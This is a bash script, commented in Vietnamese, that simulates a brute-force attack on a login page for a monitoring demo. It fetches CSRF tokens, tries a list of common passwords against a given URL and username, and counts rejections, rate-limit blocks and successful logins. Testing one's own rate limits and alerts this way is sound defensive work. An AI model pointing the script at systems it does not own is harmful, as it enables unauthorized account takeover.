#!/usr/bin/env bash
# =============================================================
# MÔ PHỎNG SỰ CỐ ATTT: tấn công dò mật khẩu (brute-force) vào trang đăng nhập.
# CHỈ dùng trên hệ thống của chính mình để demo bài tập.
#
# Cách chạy:
#   bash scripts/simulate-bruteforce.sh                       # tấn công https://localhost, user admin
#   bash scripts/simulate-bruteforce.sh https://192.168.1.50 admin 40
# =============================================================
TARGET="${1:-https://localhost}"
USERNAME="${2:-admin}"
ATTEMPTS="${3:-30}"
JAR="$(mktemp)"
trap 'rm -f "$JAR"' EXIT

PASSWORDS=(123456 password 12345678 qwerty 123456789 12345 1234 111111 1234567 dragon
           123123 baseball abc123 football monkey letmein 696969 shadow master 666666
           qwertyuiop 123321 mustang 1234567890 michael 654321 superman 1qaz2wsx 7777777 admin123
           P@ssw0rd Admin@123 iloveyou trustno1 welcome sunshine princess hello123 freedom whatever)

echo "== Mo phong brute-force: ${TARGET}/login  user=${USERNAME}  so lan=${ATTEMPTS}"
echo "== Bat dau: $(date '+%F %T')"

ok=0; fail=0; blocked=0
for ((i=0; i<ATTEMPTS; i++)); do
  pw="${PASSWORDS[$((i % ${#PASSWORDS[@]}))]}"
  # Lấy CSRF token + cookie phiên (giống trình duyệt thật)
  token=$(curl -sk -c "$JAR" -b "$JAR" -A "BruteForce-Sim/1.0" "${TARGET}/login" \
          | grep -o 'name="_csrf" value="[^"]*"' | head -1 | sed 's/.*value="//; s/"$//')
  code=$(curl -sk -o /dev/null -w '%{http_code}' -c "$JAR" -b "$JAR" -A "BruteForce-Sim/1.0" \
          --data-urlencode "_csrf=${token}" --data-urlencode "username=${USERNAME}" \
          --data-urlencode "password=${pw}" "${TARGET}/login")
  case "$code" in
    401) fail=$((fail+1));    echo "[$((i+1))] thu '${pw}' -> 401 sai mat khau" ;;
    429) blocked=$((blocked+1)); echo "[$((i+1))] thu '${pw}' -> 429 BI NGINX CHAN (rate limit)" ;;
    302) ok=$((ok+1));        echo "[$((i+1))] thu '${pw}' -> 302 DANG NHAP THANH CONG!" ;;
    *)   echo "[$((i+1))] thu '${pw}' -> HTTP ${code}" ;;
  esac
  sleep 0.3
done

echo "== Ket thuc: $(date '+%F %T')  | sai: ${fail}  | bi chan: ${blocked}  | thanh cong: ${ok}"
echo "== Mo Alertmanager (cong 9093) / Grafana (cong 3000) de xem canh bao trong ~30-60 giay."
